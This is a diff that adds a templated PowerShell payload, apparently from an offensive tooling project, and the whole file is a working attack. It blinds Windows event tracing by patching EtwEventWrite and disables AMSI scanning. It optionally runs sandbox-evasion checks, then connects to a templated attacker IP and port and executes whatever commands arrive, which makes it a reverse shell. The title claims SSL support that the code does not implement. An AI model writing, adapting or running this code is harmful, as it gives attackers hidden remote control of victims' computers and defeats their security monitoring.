@@ -1,0 +1,60 @@
+# PowerShell Reverse Shell with AMSI Bypass and SSL Support
+# ETW Blinding (FEAT-009)
+$etw = @"
+using System;
+using System.Runtime.InteropServices;
+public class Etw {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+Add-Type $etw
+$nt = [Etw]::LoadLibrary("ntdll.dll")
+$evt = [Etw]::GetProcAddress($nt, "EtwEventWrite")
+$p = 0
+# Patch with 'ret 14h' (x64) or similar to return immediately
+# x64: c3 (ret) -> simple ret is enough to stop it
+# Writing 0xc3 to the start of the function
+[Etw]::VirtualProtect($evt, [UIntPtr]::Zero + 1, 0x40, [ref]$p)
+[System.Runtime.InteropServices.Marshal]::WriteByte($evt, 0xc3)
+
+# AMSI Bypass (Matt Graeber's Reflection Method)
+try {
+    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
+    $b = $a.GetField('amsiInitFailed','NonPublic,Static');
+    $b.SetValue($null,$true);
+} catch {}
+
+{% if anti_analysis %}
+# Anti-Analysis Checks
+# 1. Sleep Check (Time Acceleration)
+$s = Get-Date
+Start-Sleep -Seconds 10
+$e = Get-Date
+if (($e - $s).TotalSeconds -lt 9.5) { exit }
+
+# 2. Resource Check
+if ((Get-CimInstance Win32_ComputerSystem).NumberOfLogicalProcessors -lt 2) { exit }
+if ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
+{% endif %}
+
+$ip = "{{ ip }}"
+$port = {{ port }}
+
+$client = New-Object System.Net.Sockets.TcpClient($ip, $port);
+$stream = $client.GetStream();
+
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
